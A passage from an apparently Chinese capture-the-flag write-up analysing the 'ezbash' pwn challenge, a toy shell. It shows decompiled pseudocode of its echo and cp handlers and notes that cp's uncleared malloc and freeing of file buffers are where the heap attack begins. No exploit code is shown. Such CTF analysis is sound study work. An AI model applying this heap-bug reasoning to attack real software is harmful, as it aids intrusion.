class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">aecho</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  file *v3; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  file *v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+14h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+14h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> chunksize; <span class=\"comment\">// [rsp+18h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> textlen; <span class=\"comment\">// [rsp+1Ch] [rbp-34h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> argv_nums; <span class=\"comment\">// [rsp+20h] [rbp-30h]</span></span><br><span class=\"line\">  file *file; <span class=\"comment\">// [rsp+28h] [rbp-28h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *filename; <span class=\"comment\">// [rsp+30h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v14; <span class=\"comment\">// [rsp+38h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v14 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">      ++v6;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( cmd[v6] );</span><br><span class=\"line\">    argv_nums = v6 - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( tofile(cmd[v6 - <span class=\"number\">2</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( i = <span class=\"number\">1</span>; i &lt; argv_nums; ++i )</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s &quot;</span>, cmd[i]);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(cmd[argv_nums]);</span><br><span class=\"line\">      result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;                                           <span class=\"comment\">// 写入文件</span></span><br><span class=\"line\">      file = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">      filename = cmd[argv_nums];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( findfile(&amp;file, filename) != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: No such file\\n&quot;</span>, filename);</span><br><span class=\"line\">        result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( checkfile(file) )               <span class=\"comment\">// 检查是否为文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        textlen = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( file-&gt;context )                    <span class=\"comment\">// 已经写过了</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          size = get_chunk_size(file-&gt;context);</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(file-&gt;context, <span class=\"number\">0</span>, size);       <span class=\"comment\">// 清空</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( j = <span class=\"number\">1</span>; j &lt; argv_nums - <span class=\"number\">1</span>; ++j )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( file-&gt;context )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            chunksize = get_chunk_size(file-&gt;context);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span>                                  <span class=\"comment\">// 空的，申请</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            chunksize = <span class=\"number\">0x150</span>;</span><br><span class=\"line\">            v3 = file;</span><br><span class=\"line\">            v3-&gt;context = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>(file-&gt;context, <span class=\"number\">0</span>, <span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          textlen += <span class=\"built_in\">strlen</span>(cmd[j]) + <span class=\"number\">2</span>;</span><br><span class=\"line\">          <span class=\"keyword\">while</span> ( textlen &gt;= chunksize )</span><br><span class=\"line\">            chunksize += <span class=\"number\">0x150</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( chunksize &gt; get_chunk_size(file-&gt;context) )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v4 = file;</span><br><span class=\"line\">            v4-&gt;context = <span class=\"built_in\">realloc</span>(file-&gt;context, chunksize);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          v5 = <span class=\"built_in\">strlen</span>(cmd[j]);</span><br><span class=\"line\">          <span class=\"built_in\">strncat</span>(file-&gt;context, cmd[j], v5);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( j &lt; argv_nums - <span class=\"number\">2</span> )</span><br><span class=\"line\">            *(file-&gt;context + <span class=\"built_in\">strlen</span>(file-&gt;context)) = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: Is a directory\\n&quot;</span>, filename);</span><br><span class=\"line\">        result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* Orphan comments:</span></span><br><span class=\"line\"><span class=\"comment\">stdout</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<p>每次 echo，都会清空 context 的内容，而且是跟据 chunksize 清空的。并且如果写的数据大于等于 chunksize-2 就会把 context 调大。而且注意。</p>\n<h4 id=\"cp\"><a class=\"markdownIt-Anchor\" href=\"#cp\">#</a> cp</h4>\n<p>整个程序攻击的开始就是在 cp，cp 可以拷贝当前目录下的文件，一个是把他的内容拷贝到当前目录下的另一个文件里，起一个是拷贝到子文件夹下的文件里，如果指定的文件不存在，会自动创建。但是佟阿姨那个调用的是 calloc40，所以没有 uaf。问题在于对 context 的复制，目标文件没有 context 指针，会申请一个，重点来了，这里用的是 malloc，而且不会清空。如果我们要拷贝的文件没有 context，会把对应的目标文件的 context     free。或者直接创建一个新的空文件。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">acp</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v2; <span class=\"comment\">// rsp</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+8h] [rbp-B0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> **comment; <span class=\"comment\">// [rsp+20h] [rbp-98h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v8; <span class=\"comment\">// [rsp+29h] [rbp-8Fh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v9; <span class=\"comment\">// [rsp+2Ah] [rbp-8Eh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v10; <span class=\"comment\">// [rsp+2Bh] [rbp-8Dh]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+2Ch] [rbp-8Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nums; <span class=\"comment\">// [rsp+30h] [rbp-88h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [rsp+34h] [rbp-84h]</span></span><br><span class=\"line\">  file *<span class=\"built_in\">list</span>; <span class=\"comment\">// [rsp+38h] [rbp-80h] BYREF</span></span><br><span class=\"line\">  file *destination; <span class=\"comment\">// [rsp+40h] [rbp-78h] BYREF</span></span><br><span class=\"line\">  file *copied_file; <span class=\"comment\">// [rsp+48h] [rbp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *s1; <span class=\"comment\">// [rsp+50h] [rbp-68h]</span></span><br><span class=\"line\">  file *curops; <span class=\"comment\">// [rsp+58h] [rbp-60h]</span></span><br><span class=\"line\">  file *ptr; <span class=\"comment\">// [rsp+60h] [rbp-58h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+68h] [rbp-50h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *dest; <span class=\"comment\">// [rsp+70h] [rbp-48h]</span></span><br><span class=\"line\">  file *curr; <span class=\"comment\">// [rsp+78h] [rbp-40h]</span></span><br><span class=\"line\">  file *temp; <span class=\"comment\">// [rsp+80h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> delim[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+8Eh] [rbp-2Ah] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v25; <span class=\"comment\">// [rsp+90h] [rbp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  comment = cmd;</span><br><span class=\"line\">  v25 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">list</span> = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  curops = cuurr_pos;</span><br><span class=\"line\">  destination = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  copied_file = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  ptr = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v8 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v9 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(delim, <span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    ++i;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[i] );</span><br><span class=\"line\">  nums = i - <span class=\"number\">1</span>;</span><br><span class=\"line\">  v13 = <span class=\"built_in\">strlen</span>(comment[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">  v20 = v13 + <span class=\"number\">1</span> - <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v6[<span class=\"number\">0</span>] = v13 + <span class=\"number\">1</span>;</span><br><span class=\"line\">  v6[<span class=\"number\">1</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">16</span> * ((v6[<span class=\"number\">0</span>] + <span class=\"number\">15</span>) / <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v6 != (v6 - (v1 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  v2 = alloca(v1 &amp; <span class=\"number\">0xFFF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (v1 &amp; <span class=\"number\">0xFFF</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    *(&amp;v6[<span class=\"number\">-1</span>] + (v1 &amp; <span class=\"number\">0xFFF</span>)) = *(&amp;v6[<span class=\"number\">-1</span>] + (v1 &amp; <span class=\"number\">0xFFF</span>));</span><br><span class=\"line\">  dest = v6;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: missing destination file operand after &#x27;%s&#x27;\\n&quot;</span>, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(dest, comment[nums]);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( s1 = strtok(dest, delim); ; s1 = strtok(<span class=\"number\">0LL</span>, delim) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !s1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( i = <span class=\"number\">1</span>; i &lt; nums; ++i )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        copied_file = curops-&gt;firstson;</span><br><span class=\"line\">        v9 = findfile(&amp;copied_file, comment[i]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9 != <span class=\"number\">1</span> || !checkfile(copied_file) )<span class=\"comment\">// 未找到 ，或者不是个文件</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, comment[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;                                       <span class=\"comment\">// 索引最后一个file</span></span><br><span class=\"line\">          destination = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">          v8 = findfile(&amp;destination, comment[i]);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            copy(copied_file, destination);     <span class=\"comment\">// 文件复制到其他位置</span></span><br><span class=\"line\">            cuurr_pos = curops;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            curr = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">            temp = calloc40();</span><br><span class=\"line\">            temp-&gt;flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">            copy_name(temp, copied_file-&gt;name);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( copied_file-&gt;context )</span><br><span class=\"line\">              copycontext(copied_file, temp);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">              temp-&gt;context = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( curr )</span><br><span class=\"line\">              link(curr, temp);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">              cuurr_pos-&gt;firstson = temp;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      cuurr_pos = curops;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;.&quot;</span>) )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">LABEL_32:</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, off_4077) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">list</span> = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  v10 = findfile(&amp;<span class=\"built_in\">list</span>, s1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v10 != <span class=\"number\">1</span> || !checkfolder(<span class=\"built_in\">list</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: target &#x27;%s&#x27; is not a directory\\n&quot;</span>, comment[nums]);</span><br><span class=\"line\">      cuurr_pos = curops;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cuurr_pos = <span class=\"built_in\">list</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums != <span class=\"number\">2</span> )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  v4 = v13;</span><br><span class=\"line\">  v5 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(&amp;dest[v4 - v5], s1) )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  copied_file = curops-&gt;firstson;</span><br><span class=\"line\">  destination = curops-&gt;firstson;</span><br><span class=\"line\">  v9 = findfile(&amp;copied_file, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v9 != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    cuurr_pos = curops;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !checkfile(copied_file) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: -r not specified; omitting directory &#x27;%s&#x27;\\n&quot;</span>, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    cuurr_pos = curops;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v8 = findfile(&amp;destination, s1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( checkfolder(destination) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      cuurr_pos = destination;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( checkfile(destination) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      copy(copied_file, destination);</span><br><span class=\"line\">      cuurr_pos = curops;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr = calloc40();</span><br><span class=\"line\">  ptr-&gt;flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">  copy_name(ptr, comment[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( copied_file-&gt;context )</span><br><span class=\"line\">    copycontext(copied_file, ptr);</span><br><span class=\"line\">  link(cuurr_pos-&gt;firstson, ptr);</span><br><span 